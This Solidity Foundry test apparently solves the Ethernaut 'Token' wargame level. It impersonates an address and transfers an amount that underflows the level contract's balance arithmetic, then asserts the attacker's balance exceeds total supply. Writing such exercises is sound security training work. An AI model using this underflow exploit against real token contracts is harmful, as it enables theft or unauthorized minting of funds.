// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Test } from "forge-std/Test.sol";
import { Token } from "ethernaut/L4.token.sol";

contract TokenCrackerTest is Test {
  Token internal token;

  function setUp() external {
    token = new Token(address(this));
  }

  function testTokenCracker() external {
    uint256 balance = token.balanceOf(address(this));

    vm.prank(address(0x420));
    token.transfer(address(this), type(uint256).max - balance);

    assertGt(token.balanceOf(address(this)), token.totalSupply());
  }
}
